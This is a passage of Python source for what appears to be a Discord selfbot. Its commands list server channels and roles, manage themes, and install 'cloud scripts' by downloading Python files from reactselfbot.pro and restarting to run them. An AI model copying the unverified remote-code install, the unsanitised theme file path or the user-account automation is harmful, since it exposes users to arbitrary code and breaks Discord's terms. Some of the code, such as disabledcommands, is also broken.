                    embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Server Channels', description='\n'.join([f"{g.name}" for g in le_channels]) or 'None',timestamp=embed_timestamp())
                    embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                    embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                    embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                    await embed_or_codeblock(ctx, embed)


                else:
                    await ctx.send(f'`Server Channels:`' + '\n'.join([f"{g.name}" for g in le_channels]) or 'None')
            except:
                pass
            
        except Exception:
            pass

    @React.command(usage="roles [Server ID]", description="Shows roles")
    async def roles(ctx, server_id: int=None):
        try:             
            if server_id is None:
                server = discord.utils.get(ctx.bot.guilds, id=ctx.guild.id)
            else: 
                server = discord.utils.get(ctx.bot.guilds, id=server_id)
                
            roles = server.roles
                
            le_roles = []   
            
            for role in roles:
                le_roles.append(role)
            try:              
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Server Roles', description='\n'.join([f"{g.name}" for g in reversed(le_roles)]) or 'None',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)
            except:
                pass
            
        except Exception:
            pass
            
    @React.command(usage="firstmessage", description="Jump to first message")
    async def firstmessage(ctx):
        try:
            channel = ctx.channel
            
            first_message = (await channel.history(limit = 1, oldest_first = True).flatten())[0]
            try:                                        
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'First Message',timestamp=embed_timestamp())
                try:
                    embed.add_field(name = "Content", value = f"{first_message.content}", inline=True)
                except:
                    pass
                try:
                    embed.add_field(name = "Channel", value = f"{first_message.channel.mention}", inline=True)
                except:
                    pass
                embed.add_field(name = "Jump URL", value = f"{first_message.jump_url}", inline=False)
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            except:
                pass
            
        except Exception:
            pass

    @React.command(usage="newtheme <Name>", description="Creates a new theme and switches to it")    
    async def newtheme(ctx, *, name: str):
        with open(f'./Themes/{name}.json', 'w') as f:
            f.write(defaulttheme)
            
        currenttheme = name
        
        with open("config.json", "r", encoding="utf-8") as jsonFile:
            data = json.load(jsonFile)
            
        data["theme"] = name
        
        with open("config.json", "w", encoding="utf-8") as jsonFile:
            json.dump(data, jsonFile, indent=4, sort_keys=False)
                
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Themes', description=f'Created new theme with the name **{name}**',timestamp=embed_timestamp())
        embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="deltheme", description="Deletes the current theme")    
    async def deltheme(ctx):
        try:
            theme_checkup()
            le_themes = []
            for filename in os.listdir('Themes'):
                if filename.endswith(".json"):
                    le_themes.append(filename[:-5])
                    
                    
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Themes', description=f'Deleted current theme.',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


            
            os.remove(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json')
            
            currenttheme = le_themes[0]
            
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data["theme"] = le_themes[0]
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
            theme_checkup()
        except Exception:
            pass

    @React.command(usage="listscripts", description="Shows your installed scripts")    
    async def listscripts(ctx):
        le_scripts = []
        for filename in os.listdir('Scripts'):
            if filename.endswith(".py"):
                le_scripts.append(filename)
                
        if len(le_scripts) <= 80:
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Custom Scripts', description=f'\n'.join([f"{script}" for script in le_scripts]),timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)

    @React.command(usage="disabledcommands", description="List of disabled commands")    
    async def disabledcommands(ctx):
        le_commands = []
        file = open('DisabledCommands.txt', 'r')
        lines = f.read().split('\n')
        for line in lines:
            if line != '':
                le_commands.append(line)

        if le_commands == ['']:
            le_commands = ["None"]
                
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Disabled Commands', description=f'\n'.join([f"{command}" for command in le_commands]),timestamp=embed_timestamp())
        embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
    @React.command(usage="themes", description="Shows the available themes")    
    async def themes(ctx):
        try:
            le_themes = []
            for filename in os.listdir('Themes'):
                if filename.endswith(".json"):
                    le_themes.append(filename[:-5])

            chunks = [le_themes[50*i:50*(i+1)] for i in range(int(len(le_themes)/50 + 1))]
            position = 0
            for i, chunk in enumerate(chunks):
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Themes', description=f'\n'.join([f'{json.load(open("config.json", encoding="utf-8"))["prefix"]}theme {theme}' for theme in chunk]),timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)
        except Exception as e:
            pass

    @React.command(usage="cloudscripts", description="Shows the available cloudscripts")    
    async def cloudscripts(ctx):
        try:
            le_scripts = []

            cloud_scripts = requests.get("https://reactselfbot.pro/api/scripts.php").json()

            for le_script in cloud_scripts["scripts"]:
                le_script = le_script.replace('scripts/', '').replace('.py', '')
                le_scripts.append(le_script)

            chunks = [le_scripts[50*i:50*(i+1)] for i in range(int(len(le_scripts)/50 + 1))]
            position = 0
            for i, chunk in enumerate(chunks):
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Cloud Scripts', description=f'\n'.join([f'{json.load(open("config.json", encoding="utf-8"))["prefix"]}cloudscriptinstall {script}' for script in chunk]),timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)
        except Exception:
            pass

    @React.command(usage="favoritecmds", description="Favorite commands")    
    async def favoritecmds(ctx):
        try:
            le_commands = []

            with open('FavoriteCommands.txt', 'r') as f:
                try:
                    lines = f.read().split('\n')
                    for line in lines:
                        if line != '':
                            le_commands.append(line)
                except:
                    pass

            if le_commands == ['']:
                le_commands = ["None"]

            chunks = [le_commands[10*i:10*(i+1)] for i in range(int(len(le_commands)/10 + 1))]
            position = 0
            for i, chunk in enumerate(chunks):
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Favorite Commands', description=f'\n'.join([f'**`{json.load(open("config.json", encoding="utf-8"))["prefix"]}`{React.get_command(str(cmd)).name}** ¬ª {React.get_command(str(cmd)).description}' for cmd in chunk]),timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)
        except Exception as e:
            print(e)

    @React.command(usage="cloudscriptinstall <Script Name>", description="Installs a cloud script")    
    async def cloudscriptinstall(ctx, script: str):
        le_scripts = []

        cloud_scripts = requests.get("https://reactselfbot.pro/api/scripts.php").json()

        for le_script in cloud_scripts["scripts"]:
            le_script = le_script.replace('scripts/', '').replace('.py', '')
            le_scripts.append(le_script)

        if script in le_scripts:

            parsed_script = f"https://reactselfbot.pro/api/scripts/{script}.py"

            open(f'./Scripts/{script}.py', 'wb').write(requests.get(parsed_script).content)
                    
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Cloud Scripts', description=f'Installed script **{script}**, the selfbot will now restart to apply.',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)
            python = sys.executable
            os.execl(python, python, *sys.argv)
        else:
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Cloud Scripts', description=f'Script **{script}** not found.',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)

    @React.command(usage="cloudthemes", description="Shows the available cloudthemes")    
    async def cloudthemes(ctx):
        try:
            le_themes = []

            cloud_themes = requests.get("https://reactselfbot.pro/api/themes.php").json()

            for theme in cloud_themes["themes"]:
                theme = theme.replace('themes/', '').replace('.json', '')
                le_themes.append(theme)

            chunks = [le_themes[50*i:50*(i+1)] for i in range(int(len(le_themes)/50 + 1))]
            position = 0
            for i, chunk in enumerate(chunks):
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Cloud Themes', description=f'\n'.join([f'{json.load(open("config.json", encoding="utf-8"))["prefix"]}cloudthemeinstall {theme}' for theme in chunk]),timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)
        except Exception:
            pass

    @React.command(usage="cloudthemeinstall <Theme Name>", description="Installs a cloud theme")    
    async def cloudthemeinstall(ctx, theme: str):
        theme_checkup()
        le_themes = []
                

        cloud_themes = requests.get("https://reactselfbot.pro/api/themes.php").json()

        for le_theme in cloud_themes["themes"]:
            le_theme = le_theme.replace('themes/', '').replace('.json', '')
            le_themes.append(le_theme)

        currenttheme = theme

        if theme in le_themes:

            parsed_theme = f"https://reactselfbot.pro/api/themes/{theme}.json"

            open(f'./Themes/{theme}.json', 'wb').write(requests.get(parsed_theme).content)
        
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data["theme"] = theme
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)

            theme_checkup()
                    
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Cloud Themes', description=f'Installed and switched theme to **{currenttheme}**',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)
        else:
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Cloud Themes', description=f'Theme **{theme}** not found.',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)

    @React.command(usage="theme <Theme Name>", description="Selects a theme")    
    async def theme(ctx, theme: str):
        theme_checkup()
        le_themes = []
        for filename in os.listdir('Themes'):
            if filename.endswith(".json"):
                le_themes.append(filename[:-5])
                
        currenttheme = theme

        if theme in le_themes:
        
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data["theme"] = theme
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)

            theme_checkup()
                    
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Themes', description=f'Switched theme to **{currenttheme}**',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)
        else:
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Themes', description=f'Theme **{theme}** not found.',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)

    @React.command(usage="languages", description="Shows the available languages")    
    async def languages(ctx):
        le_languages = []
        for filename in os.listdir('Languages'):
            if filename.endswith(".json"):
                le_languages.append(filename[:-5])
                
        if len(le_languages) <= 80:
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Languages', description=f'\n'.join([f"**[**{position}**]** {theme}" for position, theme in enumerate(le_languages[:80])]),timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        else:
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Languages', description=f'\n'.join([f"**[**{position}**]** {theme}" for position, theme in enumerate(le_languages[:80])]),timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
